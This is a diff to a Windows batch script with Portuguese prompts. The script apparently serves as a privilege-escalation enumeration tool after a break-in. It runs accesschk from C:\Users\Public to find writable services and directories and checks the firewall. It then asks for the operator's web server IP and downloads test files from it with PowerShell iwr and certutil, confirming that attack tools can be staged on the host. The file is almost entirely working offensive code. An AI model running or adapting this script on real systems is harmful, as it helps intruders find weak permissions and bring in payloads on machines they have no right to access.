@@ -32,17 +32,18 @@ echo 9. Serviços?
 sc query state= all 
 ECHO.
 echo 10. Serviços vuln?
-accesschk.exe -uqwcv %username% * /accepteula
+c:\users\public\accesschk.exe -uqwcv %username% * /accepteula
 ECHO.
 echo 11. Existe Firewall?
 netsh advfirewall show allprofiles state
 ECHO.
 echo 12. Diretórios com permissão de escrita herdada para download?
-accesschk.exe -uqwdv %username% * /accepteula
+c:\users\public\accesschk.exe -uqwdv %username% * /accepteula
 
 echo 13. Existe algum meio para download/upload de arquivos?
 set /p IP=Digite o ip do seu servidor web em python3 em CIDR (0.0.0.0):
 powershell -Command "iwr -outf c:\users\public\powershellok.txt http://%IP%:80/powershellok.txt"
+ECHO.
 certutil.exe -urlcache -split -f "http://%IP%:80/certutilok.txt" c:\users\public\certutilok.txt
 dir c:\users\public\powershellok.txt
 dir c:\users\public\certutilok.txt
